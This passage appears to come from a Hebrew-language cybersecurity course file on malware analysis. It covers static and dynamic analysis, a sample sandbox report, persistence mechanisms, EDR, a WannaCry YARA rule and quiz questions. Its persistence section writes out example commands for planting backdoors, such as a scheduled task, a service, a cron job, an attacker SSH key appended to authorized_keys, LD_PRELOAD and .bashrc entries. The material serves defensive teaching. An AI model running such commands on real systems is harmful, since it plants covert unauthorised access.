<p>תוקף פורץ לספק תוכנה ומזריק נוזקה לעדכון רשמי. <code>SolarWinds</code>, <code>Kaseya</code>, <code>3CX</code> — כולם דוגמאות. הכי קשה לזהות כי מקור העדכון "אמין".</p>

<p><strong>6. 🔗 <code>Watering Hole</code></strong></p>
<p>התוקף מזהה אתר שקהל היעד מבקר (פורום תעשייתי, אתר ממשלתי) ומפרץ אותו. כל מבקר נחשף לנוזקה. מתקפה ממוקדת ויעילה.</p>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> 90% מהפריצות מתחילות בגורם אנושי — פישינג, סיסמה חלשה, או לחיצה על קישור. טכנולוגיה לבדה לא מספיקה. הכשרת עובדים היא שכבת ההגנה הראשונה והחשובה ביותר.</div>
</div>`
      },
      {
        type: "demo",
        title: "Static Analysis — ניתוח בלי להריץ",
        content: `<div dir="rtl">
<h2>ניתוח סטטי — בחינת הקובץ בלי להפעיל אותו</h2>

<div class="info-box"><strong>ℹ️ מידע:</strong> <span class="phase-badge phase-green">Static Analysis</span> = מסתכלים על הקובץ מבחוץ — בלי להריץ. בטוח, מהיר, וחושף הרבה. זה תמיד השלב הראשון.</div>

<p><code>Static Analysis</code> = מסתכלים על הקובץ מבחוץ. בטוח, מהיר, וחושף הרבה. זה השלב הראשון בכל ניתוח.</p>

<p><strong>שלב 1: זיהוי בסיסי</strong></p>

<div class="code-preview"><pre><code># מה סוג הקובץ? (לא סומכים על הסיומת!)
file suspicious.exe
# PE32 executable (GUI) Intel 80386, for MS Windows

# Hash — "טביעת אצבע" ייחודית
sha256sum suspicious.exe
# a1b2c3d4e5f6... → מחפשים ב-VirusTotal

# גודל ותאריכים
stat suspicious.exe
# Access: 2024-01-15 08:23:00
# Modify: 2024-01-14 22:45:00</code></pre></div>

<p><strong>שלב 2: <code>Strings</code> — מחרוזות קריאות בקובץ</strong></p>

<div class="code-preview"><pre><code># מחפשים רמזים בטקסט שנמצא בתוך הבינארי
strings suspicious.exe | head -80

# מה לחפש:
strings suspicious.exe | grep -iE "http|https|ftp"     # URLs of C2
strings suspicious.exe | grep -iE "password|login|key"  # credentials
strings suspicious.exe | grep -iE "cmd|powershell|bash" # command exec
strings suspicious.exe | grep -iE "reg add|schtasks"    # persistence

# דוגמת ממצא מחשיד:
# "http://185.x.x.x:4444/beacon"  → C2 server
# "cmd.exe /c schtasks /create"   → persistence
# "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" → autorun</code></pre></div>

<p><strong>שלב 3: <code>PE Headers</code> — מטא-דאטה של הקובץ</strong></p>

<div class="code-preview"><pre><code># PEStudio (Windows) או pefile (Python)
import pefile
pe = pefile.PE("suspicious.exe")

# Imports — אילו APIs הנוזקה קוראת
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
    for func in entry.imports:
        print(f"  {func.name.decode()}")

# Imports חשודים:
# VirtualAlloc        → הקצאת זיכרון (code injection)
# WriteProcessMemory  → כתיבה לתהליך אחר
# CreateRemoteThread  → הרצת קוד בתהליך אחר
# URLDownloadToFile   → הורדת payload נוסף
# RegSetValueEx       → כתיבה ל-registry (persistence)</code></pre></div>

<div class="demo-note"><strong>טיפ:</strong> העלו את ה-<code>hash</code> ל-<code>VirusTotal</code> לפני שמתחילים ניתוח מעמיק. אם 50 אנטי-וירוסים כבר מזהים אותו — אפשר לחסוך זמן ולקרוא את הניתוחים הקיימים.</div>
</div>`
      },
      {
        type: "demo",
        title: "Dynamic Analysis — הפעלה בסביבה מבודדת",
        content: `<div dir="rtl">
<h2>ניתוח דינמי — מריצים את הנוזקה ורואים מה קורה</h2>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>🔬 Static Analysis</h4><p>בוחנים מבחוץ ללא הרצה</p><p>בטוח לחלוטין</p><p>מהיר — דקות</p><p>לא רואים קוד מוסווה</p></div>
  <div class="vs-card vs-good"><h4>🧪 Dynamic Analysis</h4><p>מריצים ב-sandbox מבודד</p><p>בטוח רק בסביבה מבודדת</p><p>לוקח זמן — שעות</p><p>חושף obfuscation והתנהגות אמיתית</p></div>
</div>

<p><code>Dynamic Analysis</code> = מפעילים את הנוזקה בסביבה מבודדת (<code>sandbox</code>) וצופים בהתנהגות. חושף קוד מוסווה (<code>obfuscated</code>) שניתוח סטטי לא מצליח לקרוא.</p>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> <strong>אף פעם</strong> אל תריצו נוזקה על מכשיר אמיתי או רשת ייצור! רק ב-<code>VM</code> מבודדת ללא גישה לרשת (או עם <code>INetSim</code> שמדמה אינטרנט).</div>

<p><strong>כלים לניטור בזמן ריצה:</strong></p>

<div class="tool-card">
  <div class="tool-card-icon">📊</div>
  <div class="tool-card-body"><strong>Process Monitor</strong><p>עוקב אחרי קבצים, registry, תהליכים. מחפשים: יצירת קבצים ב-temp, שינויי registry</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🦈</div>
  <div class="tool-card-body"><strong>Wireshark</strong><p>לוכד תעבורת רשת. מחפשים: DNS queries ל-C2, הורדת payloads</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🔧</div>
  <div class="tool-card-body"><strong>API Monitor</strong><p>מתעד קריאות API. מחפשים: CreateFile, RegSetValue, socket</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">📸</div>
  <div class="tool-card-body"><strong>Regshot</strong><p>משווה מצב registry לפני ואחרי. מחפשים: Run keys חדשים, שירותים חדשים</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🌐</div>
  <div class="tool-card-body"><strong>FakeNet-NG</strong><p>מדמה תעבורת רשת. מחפשים: C2 callbacks, DNS lookups</p></div>
</div>

<table class="content-table">
  <tr><th>כלי</th><th>מה עוקב</th><th>מה לחפש</th></tr>
  <tr><td><code>Process Monitor</code></td><td>קבצים, <code>registry</code>, תהליכים</td><td>יצירת קבצים ב-<code>temp</code>, שינויי <code>registry</code></td></tr>
  <tr><td><code>Wireshark</code></td><td>תעבורת רשת</td><td><code>DNS queries</code> ל-<code>C2</code>, הורדת <code>payloads</code></td></tr>
  <tr><td><code>API Monitor</code></td><td>קריאות <code>API</code></td><td><code>CreateFile</code>, <code>RegSetValue</code>, <code>socket</code></td></tr>
  <tr><td><code>Regshot</code></td><td>שינויים ב-<code>registry</code></td><td><code>Run keys</code> חדשים, שירותים חדשים</td></tr>
  <tr><td><code>FakeNet-NG</code></td><td>תעבורת רשת (מדומה)</td><td><code>C2</code> callbacks, <code>DNS</code> lookups</td></tr>
</table>

<p><strong>Sandbox אוטומטי:</strong></p>

<div class="code-preview"><pre><code># Cuckoo Sandbox / CAPE — ניתוח אוטומטי
# מעלים קובץ → המערכת מריצה ב-VM → דוח מפורט

# דוגמת פלט מ-sandbox:
{
  "behavior": {
    "processes": ["suspicious.exe", "cmd.exe", "powershell.exe"],
    "files_created": [
      "C:\\Users\\Public\\svchost.exe",      // מתחזה לתהליך מערכת
      "C:\\Temp\\data.zip"                    // אוסף נתונים לגניבה
    ],
    "registry_modified": [
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost"
    ],
    "dns_queries": [
      "evil-c2-server.com",                   // C2 communication
      "dns-tunnel.malware.xyz"                // DNS tunneling
    ],
    "network": [
      {"dst": "185.x.x.x", "port": 443, "protocol": "HTTPS"}
    ]
  },
  "signatures": [
    "persistence_registry_run",
    "process_masquerading",
    "data_exfiltration"
  ]
}</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> נוזקות מתוחכמות מזהות <code>sandbox</code> ומשנות התנהגות: בודקות שם מכשיר (<code>WIN-SANDBOX</code>), מספר <code>CPU cores</code> (1 = חשוד), תנועת עכבר (אין = לא אנושי), או מחכות 10 דקות לפני הפעלה. אנליסטים טובים יודעים לעקוף את הטריקים האלה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Persistence — איך נוזקה שורדת Reboot",
        content: `<div dir="rtl">
<h2>מנגנוני <code>Persistence</code> — השורדים</h2>

<p>נוזקה ללא <code>persistence</code> היא חד-פעמית — <code>reboot</code> אחד ונעלמה. לכן כמעט כל נוזקה רצינית מתקינה מנגנון שמבטיח שהיא תרוץ שוב.</p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>1. Registry Run Keys</strong><p>הנפוצות ביותר — קל לגילוי. ערך ב-HKCU/HKLM Run = רץ בכל login</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>2. Scheduled Tasks</strong><p>מתחזה לשם לגיטימי ("WindowsUpdate"). קצת קשה יותר לגילוי</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>3. Services</strong><p>דורש admin. שירות שרץ אוטומטית עם המערכת</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>4. DLL Hijacking</strong><p>מתוחכם — תהליך לגיטימי טוען DLL זדוני מתיקייה ניתנת לכתיבה</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>5. WMI Event Subscription</strong><p>מתקדם — קשה לגילוי. לא נראה ב-Task Manager הבסיסי</p></div></div>
</div>

<p><strong><code>Windows</code> — מנגנונים נפוצים (מהקל לגילוי לקשה):</strong></p>

<div class="code-preview"><pre><code># 1. Registry Run Keys (הנפוצות ביותר — קל לגילוי)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# Malware מוסיף ערך → רץ בכל login

# 2. Scheduled Tasks (נפוץ, קצת קשה יותר לגילוי)
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon
# מתחזה לשם לגיטימי

# 3. Services (דורש admin)
sc create "WinHelper" binpath= "C:\malware.exe" start= auto
# שירות שרץ אוטומטית עם המערכת

# 4. DLL Hijacking (מתוחכם)
# תהליך לגיטימי מחפש DLL בתיקייה ניתנת לכתיבה
# תוקף שם DLL זדוני באותו שם → נטען אוטומטית

# 5. Startup Folder (הכי פשוט)
C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# 6. WMI Event Subscription (מתקדם — קשה לגילוי)
# "כשהמחשב עולה, הפעל את הקוד הזה"
# לא נראה ב-Task Manager או Autoruns הבסיסי</code></pre></div>

<p><strong><code>Linux</code> — מנגנוני <code>persistence</code>:</strong></p>

<div class="code-preview"><pre><code># 1. Cron Jobs
crontab -l                          # cron של המשתמש
cat /etc/crontab                    # system-wide
ls /etc/cron.d/                     # drop-in files
# @reboot /tmp/.hidden/backdoor    # רץ בכל boot

# 2. Systemd Service
# /etc/systemd/system/backdoor.service
[Service]
ExecStart=/tmp/.hidden/backdoor
Restart=always

# 3. SSH Authorized Keys
echo "ssh-rsa AAAA... attacker@evil" >> ~/.ssh/authorized_keys
# גישה בלי סיסמה

# 4. LD_PRELOAD Hijacking
echo "LD_PRELOAD=/tmp/malicious.so" >> /etc/environment
# DLL injection style — כל תהליך טוען את הספרייה הזדונית

# 5. Bashrc / Profile
echo "/tmp/.hidden/backdoor &" >> ~/.bashrc
# רץ בכל פעם שנפתח shell</code></pre></div>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> בניקוי נוזקה, חובה לבדוק <strong>את כל</strong> מנגנוני ה-<code>persistence</code>. אם מחקתם את הקובץ הזדוני אבל שכחתם את ה-<code>scheduled task</code> — הנוזקה תוריד את עצמה מחדש אחרי <code>reboot</code>.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הגנה — EDR, YARA ו-Sandboxing",
        content: `<div dir="rtl">
<h2>שכבות הגנה מפני נוזקות</h2>

<p>אנטי-וירוס מסורתי מבוסס חתימות (<code>signatures</code>) — הוא מזהה נוזקות מוכרות. אבל כ-450,000 נוזקות חדשות מתגלות <strong>כל יום</strong>. צריך משהו חכם יותר.</p>

<p><strong><code>EDR</code> — <code>Endpoint Detection & Response</code>:</strong></p>

<table class="content-table">
  <tr><th>יכולת</th><th>מה עושה</th><th>דוגמה</th></tr>
  <tr><td>ניטור התנהגותי</td><td>מזהה פעולות חשודות, לא רק קבצים</td><td><code>PowerShell</code> טוען קוד מ-<code>Base64</code></td></tr>
  <tr><td>בידוד אוטומטי</td><td>מבודד מכשיר שזוהה כנגוע</td><td>ניתוק מהרשת תוך שניות</td></tr>
  <tr><td><code>Forensics</code></td><td>תיעוד כל פעולה — ניתוח בדיעבד</td><td><code>timeline</code> של תהליכים וקבצים</td></tr>
  <tr><td><code>Threat Hunting</code></td><td>חיפוש פרואקטיבי של איומים</td><td>חיפוש <code>IoCs</code> בכל המכשירים</td></tr>
</table>

<div class="tool-card">
  <div class="tool-card-icon">🦅</div>
  <div class="tool-card-body"><strong>CrowdStrike Falcon</strong><p>EDR מוביל — ניטור התנהגותי, בידוד אוטומטי, Threat Hunting</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🤖</div>
  <div class="tool-card-body"><strong>SentinelOne</strong><p>EDR עם AI — זיהוי אוטומטי, rollback של שינויים זדוניים</p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🛡️</div>
  <div class="tool-card-body"><strong>Microsoft Defender for Endpoint</strong><p>משולב ב-Windows — ניטור, forensics, threat hunting</p></div>
</div>

<p>מוצרים מובילים: <code>CrowdStrike Falcon</code>, <code>SentinelOne</code>, <code>Microsoft Defender for Endpoint</code>.</p>

<p><strong><code>YARA Rules</code> — כתיבת חתימות מותאמות:</strong></p>

<div class="code-preview"><pre><code>rule WannaCry_Detection {
    meta:
        description = "Detects WannaCry ransomware"
        author = "Security Team"
        date = "2017-05-12"

    strings:
        $kill_switch = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
        $ransom_note = "Wanna Decrypt0r"
        $bitcoin = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
        $smb_exploit = { 41 42 43 44 45 46 47 48 }  // hex pattern

    condition:
        2 of them  // מספיק ש-2 מתוך 4 יימצאו
}</code></pre></div>

<p><strong><code>Sandboxing</code> — הפרדה אמיתית:</strong></p>
<ul>
<li><strong>קבצים מצורפים:</strong> נפתחים ב-<code>sandbox</code> לפני שמגיעים למשתמש</li>
<li><strong>דפדפן:</strong> <code>browser isolation</code> — כל טאב רץ ב-<code>micro-VM</code></li>
<li><strong>אפליקציות:</strong> <code>application sandboxing</code> — כל אפליקציה מבודדת מהמערכת</li>
</ul>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> ההגנה הטובה ביותר היא <strong>שכבתית</strong> (<code>Defense in Depth</code>): חינוך עובדים (שכבה אנושית) + סינון אימייל (שכבת כניסה) + <code>EDR</code> (שכבת מכשיר) + סגמנטציה (שכבת רשת) + גיבויים (שכבת שחזור). שום שכבה בודדת לא מספיקה.</div>

<div class="chapter-summary"><h4>📋 סיכום פרק — Malware Analysis</h4><ul>
<li>נוזקות מגיעות בסוגים שונים: Virus, Worm, Trojan, Ransomware, Rootkit, Spyware, RAT, Botnet</li>
<li>~70% מהפריצות מתחילות בפישינג — הגורם האנושי הוא החולשה הגדולה</li>
<li>Static Analysis (מבחוץ) + Dynamic Analysis (ב-sandbox) = ניתוח מלא</li>
<li>Persistence = איך נוזקה שורדת reboot — חובה לבדוק את כל המנגנונים בניקוי</li>
<li>EDR + YARA + Sandboxing = שכבות הגנה מודרניות</li>
<li>Defense in Depth — שום שכבה בודדת לא מספיקה</li>
</ul></div>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Malware Analysis",
        titleEn: "Malware Analysis — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Virus, Worm ו-Trojan?",
            a: "שלושת סוגי הנוזקות נבדלים בעיקר באופן ההפצה.\n\nעיקרי:\n- Virus: מדביק קבצים קיימים, צריך שמישהו יפתח את הקובץ הנגוע כדי להתפשט\n- Worm: מתפשט ברשת בעצמו ללא התערבות אנושית, מנצל פגיעויות (כמו WannaCry דרך SMB)\n- Trojan: מתחזה לתוכנה לגיטימית, המשתמש מתקין אותו מרצונו\n\nטיפ:\nVirus = צריך מארח, Worm = עצמאי, Trojan = הטעיה",
            qEn: "What is the difference between a Virus, Worm, and Trojan?",
            aEn: "The three malware types differ mainly in how they spread.\n\nMain Points:\n- Virus: infects existing files, needs someone to open the infected file to spread\n- Worm: spreads across networks autonomously, exploits vulnerabilities (like WannaCry via SMB)\n- Trojan: disguises itself as legitimate software, user installs it willingly\n\nTip:\nVirus = needs host, Worm = autonomous, Trojan = deception"
          },
          {
            q: "מה ההבדל בין Static Analysis ל-Dynamic Analysis?",
            a: "שתי גישות משלימות לניתוח נוזקות.\n\nעיקרי:\n- Static: בוחנים את הקובץ ללא הרצה — strings, imports, PE headers, hash. בטוח אבל לא רואים קוד מוסווה\n- Dynamic: מריצים ב-sandbox ומתבוננים בהתנהגות — תהליכים, רשת, registry, קבצים. חושף obfuscation\n- הגישה המומלצת: static קודם (מהיר ובטוח), dynamic אחר כך (עמוק יותר)\n\nטיפ:\nStatic = מסתכלים מבחוץ, Dynamic = מריצים ומתבוננים",
            qEn: "What is the difference between Static and Dynamic Analysis?",
            aEn: "Two complementary approaches to malware analysis.\n\nMain Points:\n- Static: examines the file without running it — strings, imports, PE headers, hash. Safe but misses obfuscated code\n- Dynamic: runs in sandbox and observes behavior — processes, network, registry, files. Reveals obfuscation\n- Recommended: static first (fast, safe), dynamic after (deeper)\n\nTip:\nStatic = look from outside, Dynamic = run and observe"
          },
          {
            q: "מה Persistence ולמה חשוב לזהות את כל המנגנונים?",
            a: "Persistence הוא מנגנון שמבטיח שנוזקה תרוץ שוב אחרי reboot.\n\nעיקרי:\n- ב-Windows: Registry Run Keys, Scheduled Tasks, Services, DLL Hijacking, WMI\n- ב-Linux: Cron Jobs, Systemd Services, SSH Keys, LD_PRELOAD, bashrc\n- אם מנקים את הנוזקה אבל משאירים persistence אחד — היא חוזרת\n\nטיפ:\nבניקוי IR: רשימת בדיקה שיטתית של כל מנגנוני persistence לפני שמכריזים 'נקי'",
            qEn: "What is Persistence and why is it important to identify all mechanisms?",
            aEn: "Persistence ensures malware runs again after a reboot.\n\nMain Points:\n- Windows: Registry Run Keys, Scheduled Tasks, Services, DLL Hijacking, WMI\n- Linux: Cron Jobs, Systemd Services, SSH Keys, LD_PRELOAD, bashrc\n- If you clean the malware but leave one persistence mechanism — it comes back\n\nTip:\nDuring IR cleanup: systematic checklist of all persistence mechanisms before declaring 'clean'"
          },
          {
            q: "איך YARA rules עוזרות בזיהוי נוזקות?",
            a: "כללי YARA הם חתימות מותאמות שאנליסטים כותבים לזיהוי נוזקות לפי דפוסים.\n\nעיקרי:\n- מחפשים strings (מחרוזות טקסט), hex patterns (דפוסי בינארי), וקשרים ביניהם\n- condition מגדיר לוגיקה: 'כל הדפוסים' או 'לפחות 2 מתוך 4'\n- משמש ב-EDR, סריקת קבצים, Threat Hunting, ושיתוף עם קהילת אבטחה\n\nטיפ:\nYARA = חתימות AV מותאמות אישית שכל אנליסט יכול לכתוב",
            qEn: "How do YARA rules help in malware detection?",
            aEn: "YARA rules are custom signatures that analysts write to identify malware by patterns.\n\nMain Points:\n- Search for strings (text), hex patterns (binary), and relationships between them\n- Condition defines logic: 'all patterns' or 'at least 2 of 4'\n- Used in EDR, file scanning, Threat Hunting, and sharing with the security community\n\nTip:\nYARA = custom AV signatures that any analyst can write"
          },
          {
            q: "מה kill switch של WannaCry ולמה הוא עבד?",
            a: "Kill switch היה דומיין ארוך שהנוזקה ניסתה לגשת אליו לפני הפעלה.\n\nעיקרי:\n- WannaCry בדקה אם הדומיין קיים — אם כן, היא עצרה את עצמה\n- ככל הנראה מנגנון anti-sandbox: sandbox בדרך כלל מחזיר תשובה לכל דומיין\n- Marcus Hutchins רשם את הדומיין ב-$10.69 — וכל עותק חדש של WannaCry עצר\n- עותקים שכבר רצו לא הושפעו — רק הפצה חדשה נעצרה\n\nטיפ:\nלא כל נוזקה כוללת kill switch — זו הייתה טעות של המפתחים שהצילה מיליארדים",
            qEn: "What was WannaCry's kill switch and why did it work?",
            aEn: "The kill switch was a long domain that the malware tried to reach before activating.\n\nMain Points:\n- WannaCry checked if the domain existed — if yes, it stopped itself\n- Likely an anti-sandbox mechanism: sandboxes typically respond to any domain\n- Marcus Hutchins registered the domain for $10.69 — and all new WannaCry copies stopped\n- Already running copies were not affected — only new propagation stopped\n\nTip:\nNot all malware has a kill switch — this was a developer mistake that saved billions"
          }
        ]
      }
    ]
  }
];
